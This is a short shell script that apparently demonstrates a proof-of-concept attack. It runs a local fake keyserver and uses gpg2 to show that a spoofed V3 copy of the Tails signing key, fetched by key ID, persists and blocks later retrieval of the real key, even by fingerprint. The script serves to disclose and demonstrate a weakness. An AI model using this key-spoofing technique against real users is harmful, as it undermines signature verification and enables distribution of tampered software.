python ksitm.py &
header="==================================================="
printf "\n${header}\nRequesting the Tails signing key:\n"
gpg2 --home ./test --keyserver 127.0.0.1 --recv-key 0xBE2CD9C1
printf "\n\nWe have a spoofed copy.\n"
gpg2 --home ./test -k
sleep 0.5
printf "\n${header}\nAs you can see: It's a V3 key.\n\n"
gpg2 --home ./test --export 0xBE2CD9C1 | gpg2 --list-packets
sleep 0.5
printf "\n${header}\nIt won't be replaced by a different spoofed copy, even if we use the 64-bit keyid this time.\n"
gpg2 --home ./test --keyserver 127.0.0.1 --recv-key 0x1202821CBE2CD9C1
sleep 0.5
printf "\n${header}\nOr by the real Tails signing key, for the matter.\n"
gpg2 --home ./test --keyserver pgp.mit.edu --recv-key 0x1202821CBE2CD9C1
sleep 0.5
printf "\n${header}\nEven if we request the real Tails key by fingerprint...\n"
gpg2 --home ./test --keyserver pgp.mit.edu --keyserver-options debug --recv-key 0D24B36AA9A2A651787876451202821CBE2CD9C1
sleep 0.5
printf "\n${header}\nA final example of searching for keys. Take your pick:\n"
sleep 0.25
gpg2 --home ./test --keyserver 127.0.0.1 --search-keys 0xF2AD85AC1E42B367
